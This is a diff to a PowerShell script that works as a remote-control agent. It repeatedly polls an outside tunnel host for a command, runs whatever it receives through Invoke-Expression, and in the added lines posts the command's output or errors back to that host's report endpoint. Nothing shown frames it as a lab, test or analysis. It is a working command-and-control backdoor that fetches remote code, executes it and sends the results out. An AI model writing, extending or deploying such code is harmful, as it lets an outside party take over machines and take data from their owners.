@@ -4,17 +4,24 @@ $url = "https://85a4b5f72ca9c6.lhr.life"
 function main {
     try {
         $cmd = (Invoke-WebRequest -Uri "$url/get").Content.Trim()
-        "Invoked Web Request to: $url/get" | Out-File -Append -FilePath $log
-        if ($cmd -and $cmd -ne "noop") {
-            Invoke-Expression $cmd
-        }
-    }
+        "$((Get-Date).ToString()) - Command received: $cmd" | Out-File -Append -FilePath $log
 
-    catch
-    {
-        "Error: $($_>Exception.Message)" | Out-File -Append -FilePath $log
+        if ($cmd -and $cmd -ne "noop") {
+            try {
+                $output = Invoke-Expression $cmd | Out-String
+                $outText = "SUCCESS: $output"
+                $outText | Out-File -Append -FilePath $log
+                Invoke-WebRequest -Uri "$url/report" -Method POST -Body $outText
+            } catch {
+                $err = "ERROR: $($_.Exception.Message)"
+                $err | Out-File -Append -FilePath $log
+                Invoke-WebRequest -Uri "$url/report" -Method POST -Body $err
+            }
+        }
+    } catch {
+        "ERROR: $($_.Exception.Message)" | Out-File -Append -FilePath $log
     }
-    Start-Sleep -Seconds 1
+    Start-Sleep -Seconds 5
 }
 
 while ($true) {
